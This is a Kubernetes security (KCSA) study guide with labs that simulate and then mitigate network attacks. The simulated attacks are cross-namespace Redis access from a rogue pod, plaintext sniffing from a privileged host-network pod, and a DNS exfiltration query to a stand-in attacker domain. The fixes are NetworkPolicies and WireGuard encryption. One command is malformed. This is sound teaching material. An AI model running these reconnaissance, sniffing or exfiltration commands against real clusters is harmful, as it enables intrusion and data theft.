# Topic 4.5: Attacker on the Network (KCSA Exam Material)

**Domain:** Kubernetes & Cloud Native Security Associate (KCSA)  
**Weight:** 2.29%  
**Target Level:** Senior SRE / Principal Platform Architect  

---

## Technical Deep-Dive & Architecture Mechanics

When an adversary gains initial access to a container workload (e.g., via Remote Code Execution or a compromised web application), the cluster's network infrastructure becomes the primary vector for reconnaissance, lateral movement, data exfiltration, and Man-in-the-Middle (MitM) attacks.

```
                    +-------------------------------------------------------------+
                    |                      COMPROMISED POD                        |
                    | namespace: default                                          |
                    | IP: 10.244.1.15                                             |
                    | Attack Vector: RCE / Reverse Shell                          |
                    +-------------------------------------------------------------+
                                      |                      |
            1. Packet Sniffing /      |                      | 2. Unrestricted DNS
               Unencrypted Traffic    |                      |    Exfiltration Query
                                      v                      v
                    +--------------------+        +--------------------+
                    |  PAYMENT SERVICE   |        |  CoreDNS / Node    |
                    | namespace: finance |        | 10.96.0.10         |
                    | IP: 10.244.2.40    |        +--------------------+
                    +--------------------+                   |
                                                             | 3. Tunneling Out
                                                             v
                                                  +--------------------+
                                                  | External C2 Server |
                                                  | 198.51.100.7:53    |
                                                  +--------------------+
```

### 1. Attack Vectors in Unsegmented Flat Networks
Standard Kubernetes networking relies on a flat, IP-per-Pod model where any Pod can communicate with any other Pod across namespaces by default (as mandated by the CNI specification).

*   **ARP Spoofing / IP Spoofing:** In legacy bridge-based CNIs (e.g., standard `bridge` or unconfigured `flannel`), container interfaces share a L2 domain. An attacker can send forged ARP responses to redirect traffic intended for another Pod through the compromised Pod.
*   **Packet Sniffing (Eavesdropping):** Without encryption in transit (mTLS, IPsec, or WireGuard), plain HTTP, gRPC, or unencrypted database protocol traffic crossing overlay networks (VXLAN, Geneve) can be captured using `tcpdump` or socket raw capabilities (`CAP_NET_RAW`).
*   **Lateral Movement:** An attacker port-scans internal CIDR blocks (`10.244.0.0/16`) to discover exposed metrics endpoints (e.g., Prometheus target exporters on port `9100`), unauthenticated Redis caches, or Kubelet read-only ports (`10255`).
*   **DNS Tunneling & Exfiltration:** CoreDNS routes all standard UDP/TCP port 53 traffic. Compromised Pods can encode sensitive data into subdomains (e.g., `exfil.<base64-payload>.attacker.com`), bypassing standard HTTP egress filters.

### 2. Defense-in-Depth Control Planes
*   **Layer 3/4 Segmentation (NetworkPolicy API):** Implemented by CNI plugins (Cilium, Calico) via `iptables`, `ipsets`, or eBPF programs loaded onto veth pair hooks (`tc` or `XDP`).
*   **Layer 7 Visibility & In-Transit Encryption:** Provided by Service Meshes (Istio, Linkerd) using sidecar/ambient proxies (Envoy) or natively at L3/L4 by CNI eBPF transparent encryption (WireGuard/IPsec).
*   **Capabilities Removal:** Dropping `CAP_NET_RAW` and `CAP_NET_ADMIN` via Pod `securityContext` prevents non-root attackers from opening raw sockets or binding to low-level interfaces.

---

## Guided Exercises

### Prerequisites
You need a running Kubernetes cluster (v1.28+) with a NetworkPolicy-compliant CNI (such as Cilium or Calico) installed, and `kubectl` configured with cluster-admin access.

---

### Exercise 1: Simulating Eavesdropping & Restricting Lateral Movement via NetworkPolicies

#### Step 1: Deploy Vulnerable Architecture (Plaintext Communication)
Create a namespace `finance` and deploy a database alongside an application Pod.

```bash
kubectl create namespace finance
kubectl create namespace attacker-zone
```

Apply the following complete manifest to create a target database and a vulnerable client:

```yaml
# manifest-ex1-target.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: payment-db
  namespace: finance
  labels:
    app: payment-db
    tier: backend
spec:
  replicas: 1
  selector:
    matchLabels:
      app: payment-db
  template:
    metadata:
      labels:
        app: payment-db
        tier: backend
    spec:
      containers:
      - name: db
        image: redis:7.2-alpine
        ports:
        - containerPort: 6379
          name: redis
---
apiVersion: v1
kind: Service
metadata:
  name: payment-db-svc
  namespace: finance
spec:
  ports:
  - port: 6379
    targetPort: 6379
  selector:
    app: payment-db
```

Execute the deployment:

```bash
kubectl apply -f manifest-ex1-target.yaml
```

**Expected Output:**
```text
deployment.apps/payment-db created
service/payment-db-svc created
```

#### Step 2: Deploy Compromised Pod in Another Namespace
Deploy an untrusted container into `attacker-zone`.

```yaml
# manifest-ex1-attacker.yaml
apiVersion: v1
kind: Pod
metadata:
  name: rogue-pod
  namespace: attacker-zone
  labels:
    app: rogue-workload
spec:
  containers:
  - name: attacker
    image: nicolaka/netshoot:latest
    command: ["sleep", "3600"]
    securityContext:
      capabilities:
        add: ["NET_RAW", "NET_ADMIN"]
```

Execute deployment:

```bash
kubectl apply -f manifest-ex1-attacker.yaml
kubectl wait --for=condition=Ready pod/rogue-pod -n attacker-zone --timeout=60s
```

#### Step 3: Execute Lateral Reconnaissance & Data Access
From `rogue-pod`, scan and access `payment-db-svc` across namespace boundaries.

```bash
kubectl exec -it rogue-pod -n attacker-zone -- nc -zv payment-db-svc.finance.svc.cluster.local 6379
```

**Expected Output:**
```text
payment-db-svc.finance.svc.cluster.local (10.96.142.88:6379) open
```

Exfiltrate data directly from the unsegmented database:

```bash
kubectl exec -it rogue-pod -n attacker-zone -- redis-cli -h payment-db-svc.finance.svc.cluster.local SET credit_card "4532-xxxx-xxxx-8921"
kubectl exec -it rogue-pod -n attacker-zone -- redis-cli -h payment-db-svc.finance.svc.cluster.local GET credit_card
```

**Expected Output:**
```text
OK
"4532-xxxx-xxxx-8921"
```

#### Step 4: Enforce Zero-Trust Network Segregation
Apply a Default-Deny Ingress and Egress NetworkPolicy in the `finance` namespace, and explicitly allow traffic only from authorized frontend workloads within the same namespace.

```yaml
# manifest-ex1-policy.yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-all
  namespace: finance
spec:
  podSelector: {}
  policyTypes:
  - Ingress
  - Egress
---
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-redis-from-approved-frontend
  namespace: finance
spec:
  podSelector:
    matchLabels:
      app: payment-db
  policyTypes:
  - Ingress
  ingress:
  - from:
    - podSelector:
        matchLabels:
          app: payment-frontend
      namespaceSelector:
        matchLabels:
          kubernetes.io/metadata.name: finance
    ports:
    - protocol: TCP
      port: 6379
```

Apply policies:

```bash
kubectl apply -f manifest-ex1-policy.yaml
```

**Expected Output:**
```text
networkpolicy.networking.k8s.io/default-deny-all created
networkpolicy.networking.k8s.io/allow-redis-from-approved-frontend created
```

#### Step 5: Verify Isolation Enforcement
Re-test access from `rogue-pod`:

```bash
kubectl exec -it rogue-pod -n attacker-zone -- nc -zv -w 3 payment-db-svc.finance.svc.cluster.local 6379
```

**Expected Output:**
```text
nc: payment-db-svc.finance.svc.cluster.local (10.96.142.88:6379): Operation timed out
```

---

### Verification Questions - Section 1

1. Why does a standard Kubernetes cluster without a CNI NetworkPolicy controller allow cross-namespace communication by default?
2. In `manifest-ex1-policy.yaml`, what is the security impact if `namespaceSelector` is omitted under the `from` rule in `allow-redis-from-approved-frontend`?
3. How does dropping `CAP_NET_RAW` via container `securityContext` impair an attacker on the container network?

---

### Exercise 2: Detecting & Mitigating Unencrypted In-Transit Traffic

#### Step 1: Capture Plaintext Traffic via Diagnostics Pod
Demonstrate how an attacker on the same Node (or with host network access) can sniff Pod veth traffic when encryption is disabled.

Identify the target node for `payment-db`:

```bash
NODE_NAME=$(kubectl get pod -l app=payment-db -n finance -o jsonpath='{.items[0].spec.nodeName}')
POD_IP=$(kubectl get pod -l app=payment-db -n finance -o jsonpath='{.items[0].spec.podIP}')
echo "Target Node: ${NODE_NAME}, Target Pod IP: ${POD_IP}"
```

#### Step 2: Simulate In-Transit Packet Capture
Deploy a diagnostic container attached to the host network of the target node to simulate an attacker with node-level access or a container running with `hostNetwork: true`.

```yaml
# manifest-ex2-sniffer.yaml
apiVersion: v1
kind: Pod
metadata:
  name: node-sniffer
  namespace: kube-system
spec:
  hostNetwork: true
  nodeName: NODE_NAME_PLACEHOLDER
  containers:
  - name: tshark
    image: nicolaka/netshoot:latest
    command: ["tshark", "-i", "any", "-Y", "redis", "-a", "duration:30"]
    securityContext:
      privileged: true
```

Replace `NODE_NAME_PLACEHOLDER` and run:

```bash
sed "s/NODE_NAME_PLACEHOLDER/${NODE_NAME}/" manifest-ex2-sniffer.yaml | kubectl apply -f -
```

Generate traffic in parallel:

```bash
kubectl run test-client --image=redis:7.2-alpine -n finance -- labels="app=payment-frontend" -- redis-cli -h payment-db-svc.finance.svc.cluster.local SET secret_token "SuperSecret123"
```

Check sniffer logs to view captured plaintext sensitive payload:

```bash
kubectl logs pod/node-sniffer -n kube-system
```

**Expected Output (Snippet):**
```text
  1 0.000000000  10.244.1.22 -> 10.244.1.15  RESP 79 Request: SET secret_token SuperSecret123
  2 0.001241021  10.244.1.15 -> 10.244.1.22  RESP 22 Response: +OK
```

#### Step 3: Implement CNI Transparent Encryption (Cilium WireGuard Example)
To remediate packet sniffing across host boundaries without altering application code, enable CNI-level transparent encryption (e.g., WireGuard or IPsec).

Enable WireGuard in Cilium via ConfigMap modification or Helm values upgrade:

```bash
kubectl patch configmap cilium-config -n kube-system --type merge -p '{"data":{"enable-wireguard":"true"}}'
kubectl rollout restart daemonset/cilium -n kube-system
kubectl rollout status daemonset/cilium -n kube-system
```

#### Step 4: Verify Encryption Enforcement
Check Cilium agent status to verify WireGuard key exchange and link establishment:

```bash
CILIUM_POD=$(kubectl get pods -n kube-system -l k8s-app=cilium -o jsonpath='{.items[0].metadata.name}')
kubectl exec -n kube-system ${CILIUM_POD} -- cilium status | grep Encryption
```

**Expected Output:**
```text
Encryption: WireGuard [NodeEncryption: Disabled, WireGuardMode: opt-in/strict]
```

Inspect WireGuard interface status on host:

```bash
kubectl exec -n kube-system ${CILIUM_POD} -- wg show
```

**Expected Output:**
```text
interface: cilium_wg0
  public key: 4xK...=
  listening port: 51871

peer: Wx7...=
  endpoint: 192.168.1.50:51871
  allowed ips: 10.244.1.0/24
  latest handshake: 12 seconds ago
  transfer: 1.42 KiB received, 1.88 KiB sent
```

---

### Verification Questions - Section 2

1. What is the fundamental difference between Layer 7 mTLS (e.g., Istio Envoy sidecars) and Layer 3/4 CNI encryption (e.g., Cilium WireGuard)?
2. If an attacker gains `privileged: true` or `CAP_NET_RAW` within a Pod running on `hostNetwork: true`, can standard Kubernetes `NetworkPolicies` block their sniffing capabilities? Why or why not?

---

### Exercise 3: Mitigating DNS Exfiltration and Rogue DNS Redirection

#### Step 1: Simulate DNS Exfiltration
Attackers often use custom DNS requests to stream encoded data outside the cluster.

```bash
# Execute encoded DNS query simulating exfiltration from rogue pod
kubectl exec -it rogue-pod -n attacker-zone -- dig +short exfil-payload-data-chunk1.attacker-controlled-domain.com @10.96.0.10
```

#### Step 2: Implement Egress NetworkPolicy for DNS Lockdown
Restrict Egress DNS traffic (UDP/TCP 53) strictly to the official `kube-dns` / `CoreDNS` Service IP, blocking direct outbound connections to external DNS servers (e.g., `8.8.8.8`).

```yaml
# manifest-ex3-dns-egress.yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: restrict-dns-egress
  namespace: finance
spec:
  podSelector: {}
  policyTypes:
  - Egress
  egress:
  # Allow egress ONLY to CoreDNS pods in kube-system on port 53
  - to:
    - namespaceSelector:
        matchLabels:
          kubernetes.io/metadata.name: kube-system
      podSelector:
        matchLabels:
          k8s-app: kube-dns
    ports:
    - protocol: UDP
      port: 53
    - protocol: TCP
      port: 53
  # Allow internal intra-namespace traffic
  - to:
    - podSelector: {}
```

Apply Egress policy:

```bash
kubectl apply -f manifest-ex3-dns-egress.yaml
```

**Expected Output:**
```text
networkpolicy.networking.k8s.io/restrict-dns-egress created
```

#### Step 3: Test Direct Outbound DNS Bypass Prevention
Try querying an external resolver directly (`8.8.8.8`) from `finance` namespace to verify execution block:

```bash
kubectl run test-bypass --image=nicolaka/netshoot -n finance -it --rm -- dig @8.8.8.8 google.com +time=2
```

**Expected Output:**
```text
;; connection timed out; no servers could be reached
```

Try querying standard internal DNS (routed via CoreDNS):

```bash
kubectl run test-valid --image=nicolaka/netshoot -n finance -it --rm -- nslookup payment-db-svc.finance.svc.cluster.local
```

**Expected Output:**
```text
Server:		10.96.0.10
Address:	10.96.0.10#53

Name:	payment-db-svc.finance.svc.cluster.local
Address: 10.96.142.88
```

---

### Verification Questions - Section 3

1. Why is restricting Egress to `10.96.0.10:53` (CoreDNS Service IP) via standard NetworkPolicies insufficient by itself to prevent DNS exfiltration if CoreDNS is allowed to resolve external domains recursively?
2. How does NodeLocal DNSCache improve both network performance and security posture against DNS spoofing/eavesdropping?

---

## Production Forensics & Troubleshooting Reference

### Essential Diagnostic Commands for Network Attacks

| Metric / Target | Inspection Command | Forensic Purpose |
| :--- | :--- | :--- |
| **Active Connections** | `kubectl exec -it <pod> -- ss -tupn` | Detect suspicious outbound socket connections to unknown external IPs. |
| **Interface Capture** | `kubectl exec -it <pod> -- tcpdump -nn -i eth0 -c 100 -w /tmp/out.pcap` | Capture raw PCAP data directly from within a container's network namespace. |
| **eBPF Socket Filter** | `cilium monitor --type drop` | Trace network packets dropped by eBPF rules in real-time with reason codes. |
| **iptables Rules** | `iptables-save -t filter \| grep KUBE-POD-FW` | Audit legacy CNI firewall chain generation on node. |
| **DNS Query Audit** | `kubectl logs -n kube-system -l k8s-app=kube-dns --tail=100 \| grep DENIED` | Identify rogue DNS lookups when CoreDNS plugin `log` or `dnstap` is active. |

### Real-world eBPF Drop Monitoring Output Example (Cilium CLI)

```bash
kubectl exec -n kube-system daemonset/cilium -- cilium monitor --type drop
```

**Expected Output:**
```text
xx drop (Policy denied) flow 0x3d02a0a2 to endpoint 5412, via eth0: 10.244.3.12:48392 -> 10.244.1.15:6379 tcp SYN
xx drop (Policy denied) flow 0x8a92f1b0 to endpoint 0, via cilium_host: 10.244.3.12:53210 -> 8.8.8.8:53 udp
```

---

## Official References & Documentation

*   **Kubernetes Network Policies:** [https://kubernetes.io/docs/concepts/services-networking/network-policies/](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
*   **CNCF KCSA Exam Curriculum:** [https://github.com/cncf/curriculum/raw/master/KCSA%20Curriculum.pdf](https://github.com/cncf/curriculum/raw/master/KCSA%20Curriculum.pdf)
*   **Cilium WireGuard Encryption Mechanics:** [https://docs.cilium.io/en/stable/security/network/encryption-wireguard/](https://docs.cilium.io/en/stable/security/network/encryption-wireguard/)
*   **CoreDNS Security & Plug-ins:** [https://coredns.io/manual/toc/](https://coredns.io/manual/toc/)
*   **OWASP Kubernetes Top 10 - Insecure Networking:** [https://owasp.org/www-project-kubernetes-top-ten/](https://owasp.org/www-project-kubernetes-top-ten/)

---

## Verification Solutions

<details>
<summary><strong>Click to expand Answer Key & Detailed Explanations</strong></summary>

### Section 1 Answers

1. **Default CNI Behavior:**  
   The Kubernetes Network Model mandates that all Pods must be able to communicate with all other Pods on all nodes without NAT. Unless a `NetworkPolicy` controller is active and a Pod is explicitly "selected" by a policy, all ingress and egress interfaces remain in an unisolated state.

2. **Omission of `namespaceSelector`:**  
   If `namespaceSelector` is omitted, the `podSelector` matches Pods with `app: payment-frontend` in **any** namespace across the entire cluster. An attacker creating a Pod labeled `app: payment-frontend` in a completely untrusted namespace (e.g., `sandbox` or `dev`) would be granted full network ingress access to the production Redis database.

3. **Impact of removing `CAP_NET_RAW`:**  
   `CAP_NET_RAW` permits a process to create RAW and PACKET sockets, allowing arbitrary packet generation (ICMP, ARP spoofing) and low-level packet capture (`tcpdump` listening on `eth0`). Dropping `CAP_NET_RAW` via container `securityContext` prevents non-root attackers inside a container from initiating socket sniffing or crafting spoofed ARP frames.

---

### Section 2 Answers

1. **L7 mTLS vs L3/L4 CNI Encryption:**  
   *   **Layer 7 mTLS (Envoy/Istio):** Terminates TLS connections at user-space proxy level. It supports granular HTTP path/header routing, identity assertion via SPIFFE/SPIRE certificates, and mutual authentication. However, it incurs higher CPU overhead and latency due to proxy context switches.
   *   **Layer 3/4 CNI Encryption (WireGuard/IPsec):** Encrypts all host-to-host overlay IP traffic in kernel space (via Linux crypto API or eBPF). It is completely transparent to applications, handles non-TCP/UDP traffic natively, and operates with minimal performance overhead, but lacks L7 application-layer visibility or HTTP-level access controls.

2. **NetworkPolicy Efficacy on `hostNetwork: true`:**  
   No. Standard Kubernetes `NetworkPolicies` apply to veth interfaces associated with Pod network namespaces created by the CNI. A Pod running with `hostNetwork: true` uses the root network namespace of the Kubernetes Node (`eth0`, `cni0`). Standard `podSelector`-based NetworkPolicies cannot filter traffic traversing host-native interfaces unless the CNI explicitly supports Node-level NetworkPolicies (e.g., `CiliumNodeConfig` or Calico Host Endpoints).

---

### Section 3 Answers

1. **CoreDNS Exfiltration Bypass:**  
   Restricting Egress to the CoreDNS IP (`10.96.0.10:53`) ensures Pods cannot reach public DNS servers directly (e.g., `8.8.8.8`). However, if CoreDNS itself is configured to recursively forward non-cluster queries to public upstream resolvers (e.g., `/etc/resolv.conf` of the host), an attacker can still perform DNS exfiltration by querying `arbitrary-subdomain.attacker.com` via CoreDNS. CoreDNS will resolve the query on behalf of the attacker, effectively acting as an open exfiltration proxy. Mitigation requires DNS firewalling, FQDN Egress policies (Cilium `toFQDNs`), or response filtering.

2. **NodeLocal DNSCache Security & Performance:**  
   NodeLocal DNSCache runs a DNS caching agent on each node as a `DaemonSet` (using a link-local IP like `169.254.20.10`).  
   *   **Performance:** Queries avoid conntrack NAT table lookup bottlenecks and cross-node network latency by terminating on the local loopback/veth interface.  
   *   **Security:** Reduces the attack surface for inter-node packet sniffing and DNS cache poisoning, as DNS queries stay within the isolated node memory boundary instead of traversing unencrypted overlay tunnels to a remote CoreDNS Pod.

</details>